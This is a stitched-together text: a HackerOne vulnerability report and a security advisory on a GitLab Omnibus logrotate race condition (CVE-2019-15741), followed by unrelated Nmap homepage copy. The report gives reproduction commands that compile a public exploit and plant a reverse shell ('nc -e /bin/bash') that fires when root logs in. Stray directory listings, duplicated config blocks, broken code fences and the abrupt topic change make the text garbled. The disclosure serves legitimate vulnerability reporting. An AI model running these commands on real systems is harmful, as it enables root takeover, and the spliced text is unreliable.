# Privilege escalation due to insecure use of logrotate

**[HackerOne report #578119](https://hackerone.com/reports/578119)** by `petee` on 2019-05-12, assigned to `estrike`:

### Summary

Gitlab sets the ownership of the logdirectory to the system-user "git", which might let local users obtain root access because of unsafe interaction with logrotate.

### Steps to reproduce

Please note that the exploit is just a proof-of-concept. In order to win the race reliably the following requirements should met:

* filesystem on bare disk. don't use lvm2 or overlayfs
* don't use containers
* stop auditd
* stop tuned
* don't use selinux or apparmor

The following steps were tested with gitlab-ce and gitlab-ee on Debian Stretch(amd64):

1. `apt-get install sudo git build-essential`
2. `sudo -u git /bin/bash`
3. `git clone https://github.com/whotwagner/logrotten.git /tmp/logrotten`
4. `cd /tmp/logrotten && gcc -o logrotten logrotten.c`
5. `echo "hello gitlab" > /var/log/gitlab/gitlab-workhorse/something.log`
6. `./logrotten -c /var/log/gitlab/gitlab-workhorse/something.log`
7. `echo "if [ \`id -u\` -eq 0 ]; then (/bin/nc -e /bin/bash localhost 3333 &); fi" > /etc/bash_completion.d/something.log.1.gz`
8. `nc -nvlp 3333`
9. A root-shell connects to port 3333 as soon as user root logins(for example via ssh)

### Impact

A privilege escalation from system-user git to system-user root is possible(local root exploit).

### Examples

The path of the logdirectory of gitlab can be manipulated by user git:

```
# logdir in gitlab-ee:
drwxr-xr-x 19 git root 4096 May 12 18:43 /var/log/gitlab/
```

Logfiles rotate once a day(or another frequency if configured) by logrotate as user root. Logrotates

configuration looks like following:

```
# logrotate-config of gitlab-ee:
/var/log/gitlab/gitlab-workhorse/*.log {
  hourly

  rotate 30
  compress
  copytruncate
  missingok
  postrotate

  endscript
}
```

Due to logrotate is prone to a race-condition it is possible for user "git" to replace the

directory /var/log/gitlab/gitlab-workhorse/ with a symbolik link to any

directory(for example /etc/bash\_completion.d). Logrotate will place

files AS ROOT into /etc/bash\_completition.d and set the owner of the file to "git".

An attacker could simply place a reverse-shell into this file. As soon as root logs in, a reverse

root-shell will be executed.

Details of the race-condition can be found at:

* <https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition>
* <https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges>
* <https://github.com/whotwagner/logrotten>

### What is the current *bug* behavior?

Logrotate will write into any directory with root privileges and change the owner of the created file. This could lead to privilege escalation.

### What is the expected *correct* behavior?

Logrotate must not have permissions to write into any directory.

drwx------  2 root root 4096 Apr 25 18:40 .ssh
-rw-------  1 root root 2194 May 12 17:29 .viminfo

```

Please note that for this example the exploit writes into /etc/bash\_completion.d which requires that root logs in. It might be possible to exploit this bug without interaction of user root by writing into /etc/cron.d or anything similar.

### Output of checks

This bug was verified using the following installation methods:

* Omnibus gitlab-ee
* Omnibus gitlab-ce
* Manual installation using the instructions from <https://docs.gitlab.com/ee/install/installation.html>

#### Logrotate-configs and Logdir in gitlab manually installed

The following configuration is taken from the installation-instructions that can be found at <https://docs.gitlab.com/ee/install/installation.html>.

[/etc/logrotate.d/gitlab](https://docs.gitlab.com/ee/install/installation.html#set-up-logrotate):

```
/home/git/gitlab/log/*.log {
    daily
    missingok
    rotate 90
    compress
    notifempty
    copytruncate

    daily
    missingok
    rotate 90
    compress
    notifempty
    copytruncate
}
```

[Logdir is located in /home/git/gitlab and is configured with user "git"](https://docs.gitlab.com/ee/install/installation.html#clone-the-source):

```
sudo -u git -H git clone https://gitlab.com/gitlab-org/gitlab-ce.git -b X-Y-stable gitlab

### Mitigation

Change the owner and group of /var/log/gitlab to root or use the "su"-directive in the logrotate configuration file.

## Impact

A privilege escalation from local system-user git to system-user root is possible(local root exploit).

# Privilege Escalation via Logrotate in Gitlab Omnibus

## Overview
Identifier: AIT-SA-20190930-01
Target: GitLab Omnibus
Vendor: GitLab
Version: 7.4 through 12.2.1
Fixed in Version: 12.2.3, 12.1.8 and 12.0.8
CVE: CVE-2019-15741
Accessibility: Local
Severity: Low
Author: Wolfgang Hotwagner (AIT Austrian Institute of Technology)

## Summary
Omnibus GitLab is a way to package different services and tools required to run GitLab, so that most users can install
it without laborious configuration.

## Vulnerability Description
GitLab Omnibus sets the ownership of the log directory to the system-user "git", which might let local users obtain
root access because of unsafe
interaction with logrotate.

User “git” owns the log directory /var/log/gitlab:

```
# logdir in gitlab-ee:
drwxr-xr-x 19 git root 4096 May 12 18:43 /var/log/gitlab/
```

Log files rotate once a day (or any other frequency if configured) by logrotate as user root. The configuration does
not use the “su” directive:
```
# logrotate-config of gitlab-ee:
/var/log/gitlab/gitlab-workhorse/*.log {
  hourly
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
  endscript
}
```

Due to logrotate is prone to a race-condition it is possible for user "git" to replace the
directory /var/log/gitlab/gitlab-workhorse/ with a symbolic link to any
directory(for example /etc/bash_completion.d). Logrotate will place
files as user “root” into /etc/bash_completition.d and set the owner of the file to "git".
An attacker could simply place a reverse-shell into this file. As soon as root logs in, a reverse
root-shell will be executed.

Details of the race-condition in logrotate can be found at:
* <https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition>
* <https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges>
* <https://github.com/whotwagner/logrotten>

## Proof of Concept
The following example illustrates how an attacker who already gained a shell as user “git”, can elevate his privileges
to “root”. After downloading and compiling,
the exploit gets executed and waits until the next daily run of logrotate. If the rotation of the log file succeeds, a
new file that contains the reverse shell
payload, will be written into /etc/bash_completition.d/ with owner “git”. As soon as root logs in, the reverse shell
gets executed and opens a shell on the
attackers netcat listener:

## Vulnerable Versions
7.4 through 12.2.1

## Impact
An attacker who already achieved a valid shell as user “git” could elevate the privileges to “root”. The fact that
another exploit is
needed to get a shell lowers the severity from high to low.

## Solution
Update to GitLab Security Release: 12.2.3, 12.1.8, and 12.0.8

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).
